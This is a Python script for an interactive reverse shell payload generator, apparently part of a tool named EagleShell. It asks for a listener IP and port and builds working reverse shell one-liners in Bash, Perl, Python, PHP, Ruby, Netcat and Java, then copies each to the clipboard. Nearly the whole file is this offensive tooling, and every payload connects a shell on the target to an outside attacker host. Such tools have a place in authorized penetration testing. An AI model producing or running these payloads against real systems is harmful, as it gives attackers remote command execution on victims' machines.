#!/usr/bin/python3

from assets.banners import rsgen_banner
from assets.designs import *
from assets.properties import clear_screen

import os
import netifaces
import pyperclip


def rsgen_main():

    def payload():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(rsgen_banner)
            print(line)
            print('')
            print(author)
            print('Payload:')
            print('')
            print('\t1): Bash')
            print('\t2): Perl')
            print('\t3): Python')
            print('\t4): PHP')
            print('\t5): Ruby')
            print('\t6): Netcat')
            print('\t7): Java')
            print('\t8): Exit')
            print('')
            while True:
                shell_select = input('\u001b[33mPAYLOAD \u001b[37m> ').lower()
                if shell_select == '1':
                    bash_shell()
                elif shell_select == '2':
                    perl_shell()
                elif shell_select == '3':
                    python_shell()
                elif shell_select == '4':
                    php_shell()
                elif shell_select == '5':
                    ruby_shell()
                elif shell_select == '6':
                    netcat_shell()
                elif shell_select == '7':
                    java_shell()
                elif shell_select == '8':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def configuration():
        try:
            global lhost_set
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(rsgen_banner)
            print(line)
            print('')
            print(author)
            print('Configuration:')
            ips()
            print('')
            lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
        except KeyboardInterrupt:
            exit_shell()

    def ips():
        x = netifaces.interfaces()

        for i in x:
            if i != '':
                print('\n\tInterface: ' + i)

            try:
                ip = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr']

                print('\tIP addr: {0} '.format(ip))
            except KeyError:
                continue

    def output():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(rsgen_banner)
            print(line)
            print('')
            print(author)
            print('Output:')
            print('')
            print('\tPAYLOAD: ' + shell_set)
            print('\tLHOST: ' + lhost_set)
            print('\tLPORT: ' + lport_set)
            print('')
            print('\tOUTPUT: ' + result)
            if len(result2) > 1:
                print('\tOUTPUT: ' + result2)
            pyperclip.copy(result)
            print('')
            print('\t1): New')
            print('\t2): Exit')
            print('')
            print('\u001b[32;1m[+] Output Copied to Clipboard')
            while True:
                eagleshell_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
                if eagleshell_cmd == '1':
                    rsgen_main()
                elif eagleshell_cmd == '2':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def user_input():
        try:
            global lport_set
            configuration()
            lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
        except KeyboardInterrupt:
            exit_shell()

    def bash_shell():
        global result
        global result2
        global shell_set
        shell_set = 'Bash'
        user_input()
        result = ('bash -i >& /dev/tcp/' + lhost_set + '/' + lport_set + ' 0>&1')
        result2 = ''
        output()

    def perl_shell():
        global result
        global result2
        global shell_set
        shell_set = 'Perl'
        user_input()
        result = ("perl -e 'use Socket;$i="'"' + lhost_set + '"'";$p=" + lport_set + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname("'"tcp"'"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"'">&S"'");open(STDOUT,"'">&S"'");open(STDERR,"'">&S"'");exec("'"/bin/sh -i"'");};'")
        result2 = ''
        output()

    def python_shell():
        global result
        global result2
        global shell_set
        shell_set = 'Python'
        user_input()
        result = ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"' + lhost_set + '"'"," + lport_set + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["'"/bin/sh"'","'"-i"'"]);'")
        result2 = ''
        output()

    def php_shell():
        global result
        global result2
        global shell_set
        shell_set = 'PHP'
        user_input()
        result = ("php -r '$sock=fsockopen("'"' + lhost_set + '"'',' + lport_set + ');exec("/bin/sh -i <&3 >&3 2>&3");'"'")
        result2 = ''
        output()

    def ruby_shell():
        global result
        global result2
        global shell_set
        shell_set = 'Ruby'
        user_input()
        result = ("ruby -rsocket -e'f=TCPSocket.open("'"' + lhost_set + '"'',' + lport_set + ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"'")
        result2 = ''
        output()

    def netcat_shell():
        global result
        global result2
        global shell_set
        shell_set = 'Netcat'
        user_input()
        result = ('nc -e /bin/sh ' + lhost_set + ' ' + lport_set)
        result2 = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + lhost_set + ' ' + lport_set + ' >/tmp/f')
        output()

    def java_shell():
        global result
        global result2
        global shell_set
        shell_set = 'Java'
        user_input()
        result = ('''r = Runtime.getRuntime()
                p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/' + lhost_set + '/' + lport_set + ';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
                p.waitFor()''')
        result2 = ''
        output()

    def exit_shell():
        print('\n\u001b[31m[-] Exiting EagleShell')
        print('\u001b[0m')
        os.system(clear_screen)
        exit()

    payload()
rsgen_main()
